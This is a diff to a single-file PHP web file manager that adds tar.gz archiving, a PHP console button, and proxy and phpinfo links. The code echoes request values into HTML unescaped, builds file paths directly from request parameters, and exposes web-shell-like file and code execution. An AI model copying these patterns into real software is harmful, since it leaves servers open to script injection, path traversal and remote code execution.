 	    if(fm_chmod($path . $_REQUEST['rights'], fm_convert_rights($_REQUEST['rights_val']), @$_REQUEST['recursively']))
-		echo(__('File updated')); 
-		else echo(__('Error occurred'));
+		$msg .= (__('File updated')); 
+		else $msg .= (__('Error occurred'));
 	}
 	clearstatcache();
     $oldrights = fm_rights_string($path . $_REQUEST['rights'], true);
@@ -493,7 +676,12 @@ if(!empty($_REQUEST['edit'])){
 ?>
 <table border='0' cellspacing='0' cellpadding='1' width="100%">
 <tr>
-    <th><?=__('File manager') . ' - ' .  __('Rights') . ' - ' . $_REQUEST['rights']?></th>
+    <th><?=__('File manager').' - '.$path?></th>
+</tr>
+<tr>
+    <td class="row1">
+        <?=$msg?>
+	</td>
 </tr>
 <tr>
     <td class="row1">
@@ -503,8 +691,8 @@ if(!empty($_REQUEST['edit'])){
 <tr>
     <td class="row1" align="center">
         <form name="form1" method="post" action="<?=$link?>">
-            <input type="text" name="rights_val" value="<?=$oldrights?>"><br/>
-        <? if (is_dir($path . $_REQUEST['rights'])) {?>
+           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldrights?>">
+        <? if (is_dir($path.$_REQUEST['rights'])) {?>
             <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>
         <? } ?>
             <input type="submit" name="save" value="<?=__('Submit')?>">
@@ -516,7 +704,7 @@ if(!empty($_REQUEST['edit'])){
 } elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
 	if(!empty($_REQUEST['save'])) {
 	    rename($path . $_REQUEST['rename'], $path . $_REQUEST['newname']);
-		echo(__('File updated'));
+		$msg .= (__('File updated'));
 		$_REQUEST['rename'] = $_REQUEST['newname'];
 	}
 	clearstatcache();
@@ -526,7 +714,12 @@ if(!empty($_REQUEST['edit'])){
 ?>
 <table border='0' cellspacing='0' cellpadding='1' width="100%">
 <tr>
-    <th><?=__('File manager') . ' - ' .  __('Rename') . ' - ' . $_REQUEST['rename']?></th>
+    <th><?=__('File manager').' - '.$path?></th>
+</tr>
+<tr>
+    <td class="row1">
+        <?=$msg?>
+	</td>
 </tr>
 <tr>
     <td class="row1">
@@ -543,7 +736,6 @@ if(!empty($_REQUEST['edit'])){
 </tr>
 </table>
 <?
-
 } else {
 //Let's rock!
     $msg = '';
@@ -581,9 +773,75 @@ if(!empty($_REQUEST['edit'])){
 		set_time_limit(0);
 		$phar = new PharData($destination);
 		$phar->buildFromDirectory($source);
+		if (is_file($destination))
 		$msg .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
 		'.&nbsp;'.fm_link('download',$path.$destination,__('Download'),__('Download').' '. $destination)
-		.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $path.'" title="' . __('Delete') . ' '. $destination . '" >' . __('Delete') . '</a>';
+		.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $path.'" title="'.__('Delete').' '. $destination.'" >'.__('Delete') . '</a>';
+		else $msg .= __('Error occurred').': '.__('no files');
+	} elseif (isset($_GET['gz'])) {
+		$source = base64_decode($_GET['gz']);
+		$archive = $source.'.tar';
+		$destination = basename($source).'.tar';
+		if (is_file($archive)) unlink($archive);
+		if (is_file($archive.'.gz')) unlink($archive.'.gz');
+		clearstatcache();
+		set_time_limit(0);
+		//die();
+		$phar = new PharData($destination);
+		$phar->buildFromDirectory($source);
+		$phar->compress(Phar::GZ,'.tar.gz');
+		unset($phar);
+		if (is_file($archive)) {
+			if (is_file($archive.'.gz')) {
+				unlink($archive); 
+				$destination .= '.gz';
+			}
+
+			$msg .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
+			'.&nbsp;'.fm_link('download',$path.$destination,__('Download'),__('Download').' '. $destination)
+			.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $path.'" title="'.__('Delete').' '.$destination.'" >'.__('Delete').'</a>';
+		} else $msg .= __('Error occurred').': '.__('no files');
+	} elseif (isset($_GET['decompress'])) {
+		// $source = base64_decode($_GET['decompress']);
+		// $destination = basename($source);
+		// $ext = end(explode(".", $destination));
+		// if ($ext=='zip' OR $ext=='gz') {
+			// $phar = new PharData($source);
+			// $phar->decompress();
+			// $base_file = str_replace('.'.$ext,'',$destination);
+			// $ext = end(explode(".", $base_file));
+			// if ($ext=='tar'){
+				// $phar = new PharData($base_file);
+				// $phar->extractTo(dir($source));
+			// }
+		// } 
+		// $msg .= __('Task').' "'.__('Decompress').' '.$source.'" '.__('done');
+	} elseif (isset($_GET['gzfile'])) {
+		$source = base64_decode($_GET['gzfile']);
+		$archive = $source.'.tar';
+		$destination = basename($source).'.tar';
+		if (is_file($archive)) unlink($archive);
+		if (is_file($archive.'.gz')) unlink($archive.'.gz');
+		set_time_limit(0);
+		//echo $destination;
+		$ext_arr = explode('.',basename($source));
+		if (isset($ext_arr[1])) {
+			unset($ext_arr[0]);
+			$ext=implode('.',$ext_arr);
+		} 
+		$phar = new PharData($destination);
+		$phar->addFile($source);
+		$phar->compress(Phar::GZ,$ext.'.tar.gz');
+		unset($phar);
+		if (is_file($archive)) {
+			if (is_file($archive.'.gz')) {
+				unlink($archive); 
+				$destination .= '.gz';
+			}
+			$msg .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
+			'.&nbsp;'.fm_link('download',$path.$destination,__('Download'),__('Download').' '. $destination)
+			.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $path.'" title="'.__('Delete').' '.$destination.'" >'.__('Delete').'</a>';
+		} else $msg .= __('Error occurred').': '.__('no files');
 	}
 ?>
 <table border='0' cellspacing='0' cellpadding='1' width="100%">
@@ -600,20 +858,25 @@ if(!empty($_REQUEST['edit'])){
 		<table>
 			<tr>
 			<td>
-				<a href="./<?=basename(__FILE__)?>" title="<?=__('Home')?>"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>
+				<?=fm_home()?>
 			</td>
 			<td>
-				<form name="form1" method="post" action="<?=$url_inc?>">
+				<form " method="post" action="<?=$url_inc?>">
 				<input type="hidden" name="path" value="<?=$path?>" />
 				<input type="text" name="dirname" size="15">
 				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
 				</form>
 			</td>
 			<td>
-				<form name="form1" method="post" action="<?=$url_inc?>">
+				<form method="post" action="<?=$url_inc?>">
 				<input type="hidden" name="path" value="<?=$path?>" />
 				<input type="text" name="filename" size="15">
 				<input type="submit" name="mkfile" value="<?=__('New file')?>">
+				</form>
+			</td>
+			<td>
+				<form  method="post" action="">
+				<input type="submit" name="phprun" value="PHP <?=__('Console')?>">
 				</form>
 			</td>
 			</tr>
@@ -653,7 +916,7 @@ if(!empty($_REQUEST['edit'])){
     <th style="white-space:nowrap"> <?=__('Size')?> </th>
     <th style="white-space:nowrap"> <?=__('Date')?> </th>
     <th style="white-space:nowrap"> <?=__('Rights')?> </th>
-    <th colspan="3" style="white-space:nowrap"> <?=__('Manage')?> </th>
+    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>
 </tr>
 </thead>
 <tbody>
@@ -680,16 +943,24 @@ foreach ($elements as $file){
         $link = '<a href="'.$url_inc.'&path='.$path.$file.'" title="'.__('Show').' '.$file.'">
 		<span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$file.'
 		</a>';
-        $loadlink = (fm_root($file) || (version_compare(phpversion(), "5.3.0", "<"))) ? '' : fm_link('zip',$filename,__('Compress'),__('Archiving').' '. $file);
+        $loadlink= (fm_root($file)||$phar_maybe) ? '' : fm_link('zip',$filename,__('Compress').'&nbsp;zip',__('Archiving').' '. $file);
+		$arlink  = (fm_root($file)||$phar_maybe) ? '' : fm_link('gz',$filename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$file);
         $style = 'row2';
 		 if (!fm_root($file)) $alert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $file. '\')) document.location.href = \'' . $url_inc . '&delete=' . $file . '&path=' . $path  . '\'"'; else $alert = '';
     } else {
 		$link_img=str_replace($main_path,'http://'.$_SERVER['HTTP_HOST'],$path);
 		$link = 
 			getimagesize($filename) 
-			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''.$link_img.$file.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.$link_img.$file.'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$file.'</a>'
+			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''
+			.($safe_img ? fm_img_link($filename) : $link_img.$file)
+			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.($safe_img ? fm_img_link($filename) : $link_img.$file).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$file.'</a>'
 			: '<a href="' . $url_inc . '&edit=' . $file . '&path=' . $path. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$file.'</a>';
-        $loadlink = fm_link('download',$filename,__('Download'),__('Download').' '. $file);
+		$ext = end(explode(".", $file));
+        $loadlink =  fm_link('download',$filename,__('Download'),__('Download').' '. $file);
+		$arlink = in_array($ext,array('zip','gz','tar')) 
+		? ''
+		//? fm_link('decompress',$filename,__('Decompress'),__('Decompress').' '. $file)
+		: ((fm_root($file)||$phar_maybe) ? '' : fm_link('gzfile',$filename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $file));
         $style = 'row1';
 		$alert = 'onClick="if(confirm(\''. __('File selected').': \n'. $file. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $url_inc . '&delete=' . $file . '&path=' . $path  . '\'"';
     }
@@ -705,6 +976,7 @@ foreach ($elements as $file){
     <td><?=$deletelink?></td>
     <td><?=$renamelink?></td>
     <td><?=$loadlink?></td>
+    <td><?=$arlink?></td>
 </tr>
 <?
     }
@@ -713,12 +985,14 @@ foreach ($elements as $file){
 </tbody>
 </table>
 <div class="row3"><?
-	echo 'PHP '.phpversion();
+	echo fm_home();
+	echo ' | PHP '.phpversion();
 	$mtime = explode(' ', microtime()); 
 	$totaltime = $mtime[0] + $mtime[1] - $starttime; 
+	echo ' | '.php_ini_loaded_file();
 	echo ' | '.__('Generation time').' '.round($totaltime,2);
-	echo ' | <a href="?phpinfo=true">phpinfo</a> ';
-	//echo php_ini_loaded_file();
+	echo ' | <a href="?proxy=true">proxy</a>';
+	echo ' | <a href="?phpinfo=true">phpinfo</a>';
 	?>
 </div>
 </body>
